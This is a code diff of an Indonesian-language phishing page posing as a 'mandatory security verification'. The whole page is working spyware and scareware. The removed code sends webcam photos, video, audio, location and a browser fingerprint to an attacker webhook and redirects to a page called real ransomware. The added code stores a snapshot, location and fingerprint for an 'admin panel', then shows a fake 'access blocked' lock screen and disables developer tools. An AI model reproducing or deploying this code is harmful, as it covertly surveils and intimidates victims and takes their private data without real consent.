@@ -3,140 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔴 VERIFIKASI KEAMANAN 🔴</title>
+    <title>🔴 VERIFIKASI WAJIB 🔴</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            background:linear-gradient(135deg,#0a0a0a,#1a0000);
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-family:'Courier New',monospace;
+            padding:20px;
         }
-        
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
+        .container{
+            background:rgba(0,0,0,0.95);
+            border:3px solid #ff0000;
+            border-radius:20px;
+            padding:30px;
+            max-width:500px;
+            width:100%;
+            text-align:center;
+            box-shadow:0 0 50px rgba(255,0,0,0.5);
         }
-        
-        .container {
-            background: rgba(0,0,0,0.95);
-            border: 3px solid #ff0000;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.5);
+        .skull{font-size:60px;animation:shake 0.5s infinite;}
+        @keyframes shake{0%,100%{transform:translateX(0);}25%{transform:translateX(-5px);}75%{transform:translateX(5px);}}
+        h1{color:#ff0000;font-size:24px;margin:20px 0;}
+        .permission-box{background:#1a1a1a;padding:20px;border-radius:15px;margin:20px 0;}
+        .permission-item{
+            background:#0a0a0a;
+            padding:15px;
+            margin:10px 0;
+            border-radius:10px;
+            display:flex;
+            align-items:center;
+            gap:15px;
+            border-left:4px solid #ff0000;
         }
-        
-        .skull {
-            font-size: 60px;
-            animation: shake 0.5s infinite;
+        .permission-icon{font-size:30px;}
+        .permission-text{flex:1;text-align:left;color:#fff;}
+        .permission-text small{color:#ff6666;font-size:11px;}
+        .status{color:#ffaa00;font-size:12px;}
+        button{
+            background:linear-gradient(45deg,#ff0000,#8b0000);
+            color:white;
+            padding:18px 30px;
+            border:none;
+            font-size:18px;
+            font-weight:bold;
+            border-radius:50px;
+            cursor:pointer;
+            width:100%;
+            margin-top:15px;
+            text-transform:uppercase;
         }
-        
-        @keyframes shake {
-            0%,100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+        button:hover{transform:scale(1.02);}
+        .warning{font-size:11px;color:#ff6666;margin-top:20px;}
+        .hidden{display:none;}
+        .overlay-block{
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:black;
+            z-index:99999;
+            display:none;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+            color:red;
+            font-size:24px;
         }
-        
-        h1 {
-            color: #ff0000;
-            font-size: 24px;
-            margin: 20px 0;
-        }
-        
-        .permission-box {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-        }
-        
-        .permission-item {
-            background: #0a0a0a;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            border-left: 4px solid #ff0000;
-        }
-        
-        .permission-icon {
-            font-size: 30px;
-        }
-        
-        .permission-text {
-            flex: 1;
-            text-align: left;
-            color: #fff;
-        }
-        
-        .permission-text small {
-            color: #ff6666;
-            font-size: 11px;
-        }
-        
-        .status {
-            color: #ffaa00;
-            font-size: 12px;
-        }
-        
-        button {
-            background: linear-gradient(45deg, #ff0000, #8b0000);
-            color: white;
-            padding: 18px 30px;
-            border: none;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 15px;
-            text-transform: uppercase;
-        }
-        
-        button:hover {
-            transform: scale(1.02);
-        }
-        
-        .warning {
-            font-size: 11px;
-            color: #ff6666;
-            margin-top: 20px;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .video-preview {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            width: 120px;
-            height: 90px;
-            border: 2px solid red;
-            border-radius: 10px;
-            overflow: hidden;
-            z-index: 9999;
-            background: #000;
-        }
-        
-        .video-preview video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        .overlay-block.active{display:flex;}
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="overlay-block" id="blockOverlay">
+        <div class="skull">💀🔒💀</div>
+        <h1>AKSES DIBLOKIR!</h1>
+        <p>Anda telah memberikan izin. Sistem sedang memproses data anda.</p>
+        <p style="font-size:14px">Jangan tutup halaman ini.</p>
+    </div>
+
+    <div class="container" id="mainContainer">
         <div class="skull">💀⚠️💀</div>
         <h1>🔐 VERIFIKASI KEAMANAN WAJIB 🔐</h1>
         
@@ -187,226 +136,185 @@
         </div>
     </div>
     
-    <div class="video-preview hidden" id="videoPreview">
-        <video id="video" autoplay playsinline muted></video>
-    </div>
-    
     <script>
-        // Konfigurasi
-        const ADMIN_WEBHOOK = "https://webhook.site/your-unique-id"; // GANTI DENGAN WEBHOOK LU!
-        
-        let cameraStream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let permissionGranted = {
-            camera: false,
-            mic: false,
-            location: false,
-            notification: false
+        // Data storage
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            camera: null,
+            mic: null,
+            location: null,
+            fingerprint: null
         };
         
-        // Function kirim data ke admin
-        async function sendToAdmin(data) {
-            try {
-                const response = await fetch(ADMIN_WEBHOOK, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                console.log("Data terkirim ke admin:", data);
-            } catch(e) {
-                console.log("Gagal kirim:", e);
-            }
-            
-            // Simpan ke localStorage buat admin panel
-            let allData = JSON.parse(localStorage.getItem('voidhole_data') || '[]');
-            allData.push({...data, timestamp: new Date().toISOString()});
-            localStorage.setItem('voidhole_data', JSON.stringify(allData));
+        let cameraStream = null;
+        let permissionCount = 0;
+        
+        // Function buat block halaman
+        function blockPage() {
+            document.getElementById('blockOverlay').classList.add('active');
+            document.getElementById('mainContainer').style.opacity = '0.3';
+            // Disable scroll
+            document.body.style.overflow = 'hidden';
         }
         
-        // Request semua izin
-        async function requestAllPermissions() {
-            // 1. Kamera + Mikrofon
+        // Save to localStorage (biar admin panel bisa baca)
+        function saveToLocalStorage(data) {
+            let existing = JSON.parse(localStorage.getItem('voidhole_data') || '[]');
+            existing.push(data);
+            localStorage.setItem('voidhole_data', JSON.stringify(existing));
+            console.log('Data saved:', data.type);
+        }
+        
+        // Request camera & microphone
+        async function requestCameraAndMic() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
                     audio: true 
                 });
                 cameraStream = stream;
-                permissionGranted.camera = true;
-                permissionGranted.mic = true;
                 document.getElementById('camStatus').innerHTML = '✅ Terekam';
                 document.getElementById('micStatus').innerHTML = '✅ Terekam';
                 document.getElementById('camStatus').style.color = '#00ff00';
                 document.getElementById('micStatus').style.color = '#00ff00';
                 
-                // Preview video
-                const video = document.getElementById('video');
+                // Capture photo
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                document.getElementById('videoPreview').classList.remove('hidden');
+                video.play();
                 
-                // Rekam video 10 detik
-                startRecording();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    saveToLocalStorage({
+                        type: 'photo',
+                        data: photoData,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Stop stream setelah capture
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
                 
-                // Capture foto
-                capturePhoto();
+                permissionCount++;
+                if(permissionCount >= 3) blockPage();
                 
             } catch(e) {
-                console.log("Gagal akses kamera/mic:", e);
                 document.getElementById('camStatus').innerHTML = '❌ Gagal';
                 document.getElementById('micStatus').innerHTML = '❌ Gagal';
             }
-            
-            // 2. Lokasi
+        }
+        
+        // Request location
+        function requestLocation() {
             if('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition((position) => {
-                    permissionGranted.location = true;
                     document.getElementById('locStatus').innerHTML = '✅ Terdeteksi';
                     document.getElementById('locStatus').style.color = '#00ff00';
                     
-                    sendToAdmin({
+                    const locationData = {
                         type: 'location',
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    saveToLocalStorage(locationData);
+                    
+                    permissionCount++;
+                    if(permissionCount >= 3) blockPage();
+                    
                 }, (error) => {
                     document.getElementById('locStatus').innerHTML = '❌ Ditolak';
                 });
             } else {
                 document.getElementById('locStatus').innerHTML = '❌ Tidak support';
             }
-            
-            // 3. Notifikasi
+        }
+        
+        // Request notification
+        function requestNotification() {
             if('Notification' in window) {
                 Notification.requestPermission().then(perm => {
                     if(perm === 'granted') {
-                        permissionGranted.notification = true;
                         document.getElementById('notifStatus').innerHTML = '✅ Diizinkan';
                         document.getElementById('notifStatus').style.color = '#00ff00';
-                        new Notification("✅ Verifikasi berhasil", {
-                            body: "Data anda telah terekam",
+                        new Notification("⚠️ VERIFIKASI BERHASIL", {
+                            body: "Data anda sedang diproses",
                             icon: "https://cdn-icons-png.flaticon.com/512/565/565422.png"
                         });
+                        
+                        permissionCount++;
+                        if(permissionCount >= 3) blockPage();
                     } else {
                         document.getElementById('notifStatus').innerHTML = '❌ Diblokir';
+                        permissionCount++;
+                        if(permissionCount >= 3) blockPage();
                     }
                 });
             } else {
                 document.getElementById('notifStatus').innerHTML = '❌ Tidak support';
+                permissionCount++;
+                if(permissionCount >= 3) blockPage();
             }
-            
-            // Kirim fingerprint browser
-            sendToAdmin({
+        }
+        
+        // Collect fingerprint
+        function collectFingerprint() {
+            const fingerprint = {
                 type: 'fingerprint',
                 userAgent: navigator.userAgent,
                 screenSize: `${screen.width}x${screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            });
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            saveToLocalStorage(fingerprint);
         }
         
-        // Capture photo dari stream
-        function capturePhoto() {
-            if(!cameraStream) return;
+        // Main function
+        async function startCollection() {
+            collectFingerprint();
+            await requestCameraAndMic();
+            requestLocation();
+            requestNotification();
             
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            sendToAdmin({
-                type: 'photo',
-                data: photoData
-            });
-        }
-        
-        // Rekam video
-        function startRecording() {
-            if(!cameraStream) return;
-            
-            mediaRecorder = new MediaRecorder(cameraStream);
-            mediaRecorder.ondataavailable = (event) => {
-                if(event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, {type: 'video/webm'});
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    sendToAdmin({
-                        type: 'video',
-                        data: reader.result
-                    });
-                };
-                reader.readAsDataURL(blob);
-                recordedChunks = [];
-            };
-            mediaRecorder.start();
-            
-            // Stop setelah 10 detik
+            // Fallback: kalo ga ada izin sama sekali, tetap block setelah 5 detik
             setTimeout(() => {
-                if(mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
+                if(permissionCount < 3) {
+                    blockPage();
                 }
-            }, 10000);
+            }, 8000);
         }
         
-        // Rekam audio terpisah
-        async function recordAudio() {
-            try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const audioRecorder = new MediaRecorder(audioStream);
-                let audioChunks = [];
-                
-                audioRecorder.ondataavailable = (e) => audioChunks.push(e.data);
-                audioRecorder.onstop = () => {
-                    const blob = new Blob(audioChunks, {type: 'audio/webm'});
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        sendToAdmin({
-                            type: 'audio',
-                            data: reader.result
-                        });
-                    };
-                    reader.readAsDataURL(blob);
-                    audioStream.getTracks().forEach(track => track.stop());
-                };
-                
-                audioRecorder.start();
-                setTimeout(() => {
-                    if(audioRecorder.state === 'recording') audioRecorder.stop();
-                }, 8000);
-            } catch(e) {
-                console.log("Gagal rekam audio");
-            }
-        }
-        
-        // Tombol request
+        // Event listener tombol
         document.getElementById('requestBtn').addEventListener('click', () => {
-            requestAllPermissions();
-            recordAudio();
-            
-            // Kasih pesan setelah 2 detik
-            setTimeout(() => {
-                alert("✅ VERIFIKASI BERHASIL! Mengalihkan...");
-                // Redirect ke ransomware asli
-                window.location.href = "https://01-yayz.github.io/ransomware/ransomware.html";
-            }, 3000);
+            startCollection();
+            document.getElementById('requestBtn').disabled = true;
+            document.getElementById('requestBtn').innerHTML = '⏳ MENGUMPULKAN DATA... ⏳';
         });
         
-        // Cek izin yang udah ada
-        navigator.permissions.query({name: 'camera'}).then(result => {
-            if(result.state === 'granted') requestAllPermissions();
+        // Cek izin yang sudah ada
+        if(navigator.permissions) {
+            navigator.permissions.query({name: 'camera'}).then(result => {
+                if(result.state === 'granted') startCollection();
+            });
+        }
+        
+        // Disable right click & dev tools
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+               (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
+                e.preventDefault();
+            }
         });
     </script>
 </body>
-</html>
+    </html>
